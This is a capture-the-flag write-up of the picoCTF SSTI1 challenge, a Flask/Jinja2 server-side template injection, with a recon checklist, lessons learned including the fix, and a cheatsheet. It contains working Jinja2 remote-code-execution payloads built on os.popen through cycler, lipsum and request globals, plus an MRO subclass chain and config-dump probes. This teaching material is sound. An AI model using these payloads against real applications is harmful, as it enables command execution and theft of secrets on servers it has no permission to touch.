## Overview

SSTI1 is a web exploitation challenge built on a **Flask app using the Jinja2 template engine**. The site lets you submit an "announcement" that gets rendered back to you on the page. The problem: your input is dropped directly into the template string instead of being passed as data, so anything you type gets *evaluated* as template code. That's Server-Side Template Injection, and it's a fast path from "echo a string" to full remote code execution.

## Initial Recon

Before touching the actual vuln, run the same enumeration checklist you'd run on any web-app CTF. Building this habit matters more than the flag, because on harder challenges the recon *is* the hint.

**1. Look at the page.** Load the site, read the visible text, and note every input: forms, search boxes, URL parameters, file uploads. Here, the announcement form is the obvious attack surface.

**2. View source and read the HTML.** Check for comments, hidden fields, dev notes, and JS files. Challenge authors leave hints in source more often than you'd think.

**3. Inspect requests.** Open DevTools (Network tab) or Burp and watch what the form actually sends. Note the method (GET vs POST), parameter names, and how your input comes back in the response. Seeing your input reflected on the page is the first flag for any injection class.

**4. Fingerprint the stack.** Check response headers (`Server`, `X-Powered-By`), cookie names (a `session` cookie that looks like Flask's signed format is a tell), and error page styling. This one screams Python/Flask.

**5. Check the usual files.**
```
/robots.txt
/sitemap.xml
/.git/
/admin
```
Not every challenge uses these, but checking costs seconds.

**6. Probe the input for how it's handled.** Submit something benign, then something special. Does HTML render? Does `{{ }}` evaluate? This is where recon hands off to exploitation.

## Walkthrough

**1. Detect the injection.**
Submit a math expression wrapped in Jinja's output syntax:

```
{{7*7}}
```

The page returns `49` instead of the literal text. If `{{7*7}}` is being evaluated server-side, you have SSTI.

**2. Fingerprint the engine.**
Different engines handle string math differently. Submit:

```
{{7*'7'}}
```

- Jinja2 (Python) returns `7777777` (string repetition)
- Twig (PHP) returns `49`

You'll get `7777777`, confirming **Jinja2 / Python**, which tells you exactly which payloads to reach for next.

**3. Escalate to RCE.**
The goal is to break out of the template sandbox and reach Python's `os` module. The cleanest reliable payload uses the globals attached to a built-in object. List the directory first:

```
{{ cycler.__init__.__globals__.os.popen('ls').read() }}
```

You'll see a file named `flag` in the output.

**4. Read the flag.**

```
{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}
```

That dumps the `picoCTF{...}` flag. Done.

> If `cycler` is filtered, `lipsum.__globals__.os.popen('cat flag').read()` and `request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()` are drop-in alternatives that work on the same app.

---

## Lessons Learned

- **SSTI happens when user input is concatenated into the template, not passed as a context variable.** The vulnerable pattern is `render_template_string("... " + user_input)`. The fix is to render a static template and pass user input as data: `render_template_string("{{ msg }}", msg=user_input)`.
- **`{{7*7}}` is your universal probe,** but confirming the *engine* matters. `{{7*'7'}}` is the single best fingerprint because the behavior forks cleanly between Python and PHP engines, and that decides your whole exploit chain.
- **Python's object model is the real attack surface.** Once you're in a Jinja2 context, almost any object (`cycler`, `lipsum`, `request`, `config`, `self`) is a doorway to `__globals__`, and from there to `os`. You're not really attacking the template, you're walking Python's introspection graph back to code execution.

---

## Cheatsheet

**Recon checklist**
```
- Read page + note every input
- View source, check comments + JS
- Watch requests (DevTools / Burp)
- Fingerprint stack (headers, cookies, errors)
- Check /robots.txt /sitemap.xml /.git/ /admin
- Probe inputs: HTML? template eval?
```

**Detection**
```
{{7*7}}            → 49 means SSTI
${7*7}             → alt syntax (some engines)
<%= 7*7 %>         → alt syntax (ERB/others)
```

**Engine fingerprint**
```
{{7*'7'}}          → 7777777 = Jinja2/Python | 49 = Twig/PHP
```

**Recon (Jinja2)**
```
{{ config }}
{{ config.items() }}
{{ self.__init__.__globals__ }}
```

**RCE payloads (Jinja2) — swap the command in popen()**
```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('ls').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```

**Classic MRO chain (when the shortcuts are filtered)**
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
# find subprocess.Popen's index, then call it to run commands
```

**Read the flag**
```
{{ lipsum.__globals__.os.popen('cat flag').read() }}
```
